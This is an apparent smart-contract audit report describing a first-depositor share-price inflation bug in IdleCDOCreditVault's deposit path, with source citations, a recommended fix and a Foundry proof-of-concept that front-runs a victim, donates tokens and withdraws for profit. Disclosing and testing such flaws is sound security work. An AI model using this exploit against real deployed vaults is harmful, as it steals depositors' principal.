### Title
First-depositor/donation share-price inflation via unskimmed `getContractValue()` in `_deposit` - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault._deposit` runs `_updateAccounting()` before minting tranche shares, and `_updateAccounting` prices shares off `getContractValue()`, which includes the contract's **raw underlying token balance**. Unlike `IdleCDOEpochVariant`, this deposit path performs no `_skimDonatedAssets()` call, so a direct ERC20 transfer to the CDO is crystallized as a NAV gain into `priceAA`/`priceBB`. An attacker can front-run the first depositor, mint a dust position, donate underlying to inflate the tranche price, let the victim's deposit mint at the inflated price (rounding down), then withdraw for a ~50% profit — the exact bug class from the referenced report.

### Finding Description
The share-minting formula is `_minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)` in `_mintSharesAtCurrPrice` [1](#0-0) . The price used is `priceAA`/`priceBB`, last written by `_updateAccounting`, which computes `nav = getContractValue()` = `strategyToken balance + raw token balance - unclaimedFees` [2](#0-1)  and distributes any `nav - lastNAV` delta into tranche NAVs and prices via `_virtualPriceAux` [3](#0-2) .

`_deposit` calls `_updateAccounting()` and then mints at the freshly updated price, with no donation skim [4](#0-3) . For a zero-supply tranche `_tranchePrice` returns `oneToken` [5](#0-4) , so Bob's 1-wei deposit mints `1e18/oneToken` shares with `lastNAVAA = 1`. Bob then transfers `D` underlying directly to the CDO. When Alice deposits, `_updateAccounting` sees `nav = 1 + D`, books the donation as gain, sets `priceAA ≈ (1 + D)(1 - fee) / supply`, and `lastNAVAA ≈ 1 + D`. Alice's mint `V * 1e18 / priceAA` rounds down to a handful of shares; Bob's dust shares are redeemable for ≈ `(1 + D + V) * supply / (supply + aliceShares)`, i.e. roughly half of `V` when `D ≈ V`. Withdrawals via inherited `_withdraw`/`_withdrawOps` pay out at the same NAV-based price [6](#0-5) .

### Impact Explanation
Direct theft of user funds: the first real depositor of a tranche loses up to ~50% of deposited principal to the front-running donor, who exits at the inflated price through a normal `withdrawAA`/`withdrawBB`. Quantitatively identical to the reference PoC (≈500k profit on a 2M deposit when `D ≈ 1M`).

### Likelihood Explanation
Requires an unprivileged but `isWalletAllowed`-passing lender to front-run the first deposit of a tranche (or any tranche whose supply has returned to ~0). Cost is only the donated capital's residual exposure; profit scales with victim deposit size.

**Important caveat — verify deployment status before reporting:** `IdleCDOEpochVariant._deposit` overrides this path and *does* call `_skimDonatedAssets()` before `super._deposit` [7](#0-6) , and `virtualPrice` uses `_managedContractValue()` which excludes raw token balance [8](#0-7) . The vulnerability therefore only exists if `IdleCDOCreditVault` (or another subclass that does not add the skim) is itself deployed as a standalone credit vault. If every production deployment is `IdleCDOEpochVariant`/`IdleCDOEpochVariantPrefunded`, the donation vector is already neutralized and this should be downgraded/dismissed. I could not confirm from the index whether `IdleCDOCreditVault` is declared `abstract` or deployed directly.

### Recommendation
Call `_skimDonatedAssets()` at the top of `IdleCDOCreditVault._deposit` (and before any `_updateAccounting` reachable by users, including the inherited `_withdraw`), matching the epoch-variant mitigation [9](#0-8) ; alternatively compute `_updateAccounting`'s NAV from `_managedContractValue()` so raw donations can never crystallize into tranche prices. If the base contract is not meant for standalone deployment, mark it `abstract`.

### Proof of Concept
Foundry, against a deployed/standalone `IdleCDOCreditVault` with USDC-like `token` (6 decimals), zero fees:

```solidity
function test_FirstDepositorInflation() public {
    uint256 V = 2_000_000e6; // Alice deposit
    uint256 D = 1_000_000e6; // Bob donation

    deal(token, bob,   V);
    deal(token, alice, V);

    // Bob front-runs: first deposit mints dust shares (price == oneToken at supply 0)
    vm.startPrank(bob);
    IERC20(token).approve(address(cdo), 1);
    uint256 bobShares = cdo.depositAA(1);          // supply ~ 1e12, lastNAVAA = 1
    IERC20(token).transfer(address(cdo), D);       // raw donation, NOT skimmed in this variant
    vm.stopPrank();

    // Alice's deposit is mined: _updateAccounting crystallizes D into priceAA,
    // then she mints at the inflated price (rounds down to ~1 share-unit)
    vm.startPrank(alice);
    IERC20(token).approve(address(cdo), V);
    uint256 aliceShares = cdo.depositAA(V);
    vm.stopPrank();

    assertLt(aliceShares * cdo.virtualPrice(cdo.AATranche()) / 1e18, V / 2 + 1);

    // Bob redeems his dust shares for ~1.5M
    vm.prank(bob);
    cdo.withdrawAA(bobShares);

    assertGt(IERC20(token).balanceOf(bob), V + D / 2); // Bob profit ≈ V/2
    assertLt(IERC20(token).balanceOf(alice), V * 3 / 4);
}
```

Key difference from the epoch variant: `IdleCDOEpochVariant._deposit` would have swept Bob's `D` to `feeReceiver` before `_updateAccounting`, so `priceAA` never inflates [10](#0-9) ; the base credit vault's `_deposit` lacks that guard [11](#0-10) .

### Citations

**File:** contracts/IdleCDOCreditVault.sol (L125-128)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L133-137)
```text
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L191-212)
```text
  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L227-248)
```text
    uint256 nav = getContractValue();
    uint256 _aprSplitRatio = trancheAPRSplitRatio;
    // If gain is > 0, then collect some fees in `unclaimedFees`
    if (nav > _lastNAV) {
      unclaimedFees += (nav - _lastNAV) * fee / FULL_ALLOC;
    }
    (uint256 _priceAA, int256 _totalAAGain) = _virtualPriceAux(AATranche, nav, _lastNAV, _lastNAVAA, _aprSplitRatio);
    (uint256 _priceBB, int256 _totalBBGain) = _virtualPriceAux(BBTranche, nav, _lastNAV, _lastNAVBB, _aprSplitRatio);
    lastNAVAA = uint256(int256(_lastNAVAA) + _totalAAGain);
    lastNAVBB = uint256(int256(_lastNAVBB) + _totalBBGain);

    // Ordinary losses exhaust BB before reducing AA. Stop normal interactions once BB is wiped,
    // or when an AA-only vault is fully wiped, so the loss must be crystallized explicitly.
    if ((_totalBBGain < 0 && -_totalBBGain >= int256(_lastNAVBB)) || (_lastNAV != 0 && nav == 0)) {
      shutdown = true;
      if (!skipDefaultCheck) revert Default();
      // Keep a total wipe distinguishable from an uninitialized vault when no BB NAV existed.
      if (nav == 0) _priceAA = 0;
      _emergencyShutdown(true);
    }
    priceAA = _priceAA;
    priceBB = _priceBB;
```

**File:** contracts/IdleCDOCreditVault.sol (L344-348)
```text
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L369-382)
```text
  function _withdrawOps(uint256 _amount, uint256 _underlyings, address _tranche) internal {
    // burn tranche token
    IdleCDOTranche(_tranche).burn(msg.sender, _amount);

    // update NAV with the _amount of underlyings removed
    if (_tranche == AATranche) {
      lastNAVAA -= _underlyings;
    } else {
      lastNAVBB -= _underlyings;
    }

    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L422-427)
```text
  function _tranchePrice(address _tranche) internal view returns (uint256) {
    if (_trancheSupply(_tranche) == 0) {
      return oneToken;
    }
    return _tranche == AATranche ? priceAA : priceBB;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L643-650)
```text
  /// @notice Deposit funds in the vault. Overrides the parent method and adds a check for wallet 
  function _deposit(uint256 _amount, address _tranche) internal override whenNotPaused returns (uint256) {
    _checkNotAllowed(!isWalletAllowed(msg.sender));
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
    // do the inherited deposit flow
    return super._deposit(_amount, _tranche);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```
